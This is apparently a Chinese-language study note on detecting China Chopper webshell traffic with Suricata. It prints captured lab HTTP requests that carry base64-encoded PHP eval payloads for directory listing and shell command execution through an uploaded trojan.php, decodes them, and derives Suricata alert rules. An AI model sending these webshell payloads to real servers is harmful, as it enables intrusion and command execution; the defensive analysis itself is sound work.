[TOC]



# ==Suricata菜刀流量分析==

教材内容

#### 一、捕获菜刀流量

##### 1、代码上传

```http
POST http://192.168.230.188/security/temp/trojan.php HTTP/1.1
X-Forwarded-For: 2.180.20.22
Referer: http://192.168.230.188/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Host: 192.168.230.188
Content-Length: 672
Pragma: no-cache

a=eval(base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9Jy8nOyRGPUBvcGVuZGlyKCREKTtpZigkRj09TlVMTCl7ZWNobygiRVJST1I6Ly8gUGF0aCBOb3QgRm91bmQgT3IgTm8gUGVybWlzc2lvbiEiKTt9ZWxzZXskTT1OVUxMOyRMPU5VTEw7d2hpbGUoJE49QHJlYWRkaXIoJEYpKXskUD0kRC4nLycuJE47JFQ9QGRhdGUoIlktbS1kIEg6aTpzIixAZmlsZW10aW1lKCRQKSk7QCRFPXN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkUCksMTAsOCksLTQpOyRSPSJcdCIuJFQuIlx0Ii5AZmlsZXNpemUoJFApLiJcdCIuJEUuIlxuIjtpZihAaXNfZGlyKCRQKSkkTS49JE4uIi8iLiRSO2Vsc2UgJEwuPSROLiRSO31lY2hvICRNLiRMO0BjbG9zZWRpcigkRik7fTtlY2hvKCJYQFkiKTtkaWUoKTs%3D'));
```

> base64URL解码之后的内容
>
> %3D 是 =
>
> ```php
> @ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$D='/';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("X@Y");die();
> ```

```http
X@Y./	2023-09-10 17:26:53	224	0555
../	2023-09-10 17:26:53	224	0555
boot/	2024-10-18 09:34:23	4096	0555
dev/	2025-02-17 06:13:03	3120	0755
home/	2025-02-07 15:59:42	21	0755
proc/	2025-02-17 06:12:27	0	0555
run/	2025-02-17 06:13:12	740	0755
sys/	2025-02-17 06:12:43	0	0555
etc/	2025-02-17 06:13:10	8192	0755
root/	2024-08-28 15:50:13	260	0550
var/	2025-02-07 14:26:50	280	0755
tmp/	2025-02-17 07:50:01	4096	1777
usr/	2023-09-10 17:20:08	155	0755
bin/	2025-02-14 17:52:31	24576	0555
sbin/	2025-02-14 17:52:32	16384	0555
lib/	2025-02-14 17:52:31	4096	0555
lib64/	2025-02-14 17:52:31	24576	0555
media/	2018-04-11 06:59:55	6	0755
mnt/	2024-08-28 11:17:29	18	0755
opt/	2025-02-15 10:05:13	4096	0755
srv/	2018-04-11 06:59:55	6	0755
X@Y
```



##### 2、文件浏览

```http
POST http://192.168.230.188/security/temp/trojan.php HTTP/1.1
X-Forwarded-For: 2.180.20.22
Referer: http://192.168.230.188/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Host: 192.168.230.188
Content-Length: 710
Pragma: no-cache

a=eval(base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9Jy9vcHQvbGFtcHAvaHRkb2NzL3NlY3VyaXR5L3RlbXAvJzskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuJy8nLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiJcbiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygiWEBZIik7ZGllKCk7'));
```

> base64URL解码之后的内容
>
> ```php
> @ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$D='/opt/lampp/htdocs/security/temp/';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("X@Y");die();
> ```

```http
X@Y./	2025-02-17 12:02:09	197	0757
../	2025-02-16 16:17:40	4096	0755
xupt.html	2024-07-09 15:07:37	169	0644
shell.php	2024-08-02 09:03:48	643	0644
trojan.php	2024-07-13 16:06:46	31	0644
muma.php	2024-07-30 09:12:58	202	0644
trojan2.php	2024-07-30 08:43:38	26	0644
trojan3.php	2024-07-30 09:41:00	27	0644
remotefileinc.zip	2024-07-31 09:03:23	205	0644
shell.aspx	2024-08-02 09:03:54	444	0644
cspreport.txt	2024-09-26 03:23:22	658	0646
gif_shell.pHp	2025-02-17 12:02:09	35	0644
X@Y
```

##### 3、命令执行

```http
POST http://192.168.230.188/security/temp/trojan.php HTTP/1.1
X-Forwarded-For: 2.180.20.22
Referer: http://192.168.230.188/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Host: 192.168.230.188
Content-Length: 728
Pragma: no-cache

a=eval(base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JG09Z2V0X21hZ2ljX3F1b3Rlc19ncGMoKTskcD0nL2Jpbi9zaCc7JHM9J2NkIC9vcHQvbGFtcHAvaHRkb2NzL3ZhdWRpdC1kZWJ1Zy9zeXMvO2xzO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXSc7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI%2FIi1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOyRyPSJ7JHB9IHskY30iOyRhcnJheT1hcnJheShhcnJheSgicGlwZSIsInIiKSxhcnJheSgicGlwZSIsInciKSxhcnJheSgicGlwZSIsInciKSk7JGZwPXByb2Nfb3Blbigkci4iIDI%2BJjEiLCRhcnJheSwkcGlwZXMpOyRyZXQ9c3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pO3Byb2NfY2xvc2UoJGZwKTtwcmludCAkcmV0OztlY2hvKCJYQFkiKTtkaWUoKTs%3D'));
```

> base64URL解码之后的内容
>
> %2F 是 /
>
> %2B 是 +
>
> 我们可以发现，`QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7` 在 base64 代码中出现了多次，同时可以确定，这一段 base64 字符会存在每一个请求中，所以他也会成为我们的判定标准

```http
HTTP/1.1 200 OK
Date: Mon, 17 Feb 2025 11:06:32 GMT
Server: Apache/2.4.38 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev Perl/v5.16.3
X-Powered-By: PHP/5.6.40
Content-Length: 81
Content-Type: text/html; charset=UTF-8

X@Yconfig.php
install.lock
lib.php
[S]
/opt/lampp/htdocs/vaudit-debug/sys
[E]
X@Y
```

#### 二、分析特征

菜刀的流量由于没有进行加密，所以各类特征非常明显，以下一些规则均可以将菜刀进行识别

（1）部分菜刀响应里面存在 ->| 作为响应正文的开头，响应的末尾以 |<- 结束；当然我这个菜刀使用 X@Y 作为标识符

（2）请求正文部分至少存在 eval 或 base64_decode 或 可以用于识别

（3）z0参数是一直存在的核心代码，所以z0的Base64解码后的开头的代码：`@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);`, 所以，Base64编码后也必然是一样的内容。

但是在我这个版本里面，我的菜刀是 `@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");` 

##### 1、识别响应的开头和结束部分

```yaml
alert http any any <> $HOME_NET 80 (msg:"菜刀-1"; http.response_body; content: "|2d 3e 7c|"; startswith; content: "|7c 3c 2d|"; endswith; classtype: web-shell-attack; sid: 5618001; rev: 1;)
```

##### 2、识别非Base64部分

```yaml
alert http any any -> $HOME_NET 80 (msg:"菜刀-2"; content: "eval"; http_client_body; pcre: "/base64_decode.+POST.+z0=/i"; classtype: web-shell-attack; sid: 5618002; rev: 1;)
```

##### 3、对Base64进行识别

```yaml
http_client_body; 要放在 content 参数后面

alert http $EXTERNAL_NET any <> $HOME_NET $HTTP_PORTS (msg:"菜刀-3"; content:"QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7"; http_client_body; classtype:web-shell-attack; sid: 5618003; rev:1;)
```

![image-20250217205541223](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250217205541223.png)

```yaml
# 检测菜刀流量
alert http $EXTERNAL_NET any <> $HOME_NET $HTTP_PORTS (msg:"菜刀-1"; http.response_body; content: "X@Y"; startswith; content: "X@Y"; endswith; classtype: web-shell-attack; sid: 5618001; rev: 1;)
alert http $EXTERNAL_NET any <> $HOME_NET $HTTP_PORTS (msg:"菜刀-2"; content:"QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7"; http_client_body; classtype:web-shell-attack; sid: 5618002; rev:1;)
```

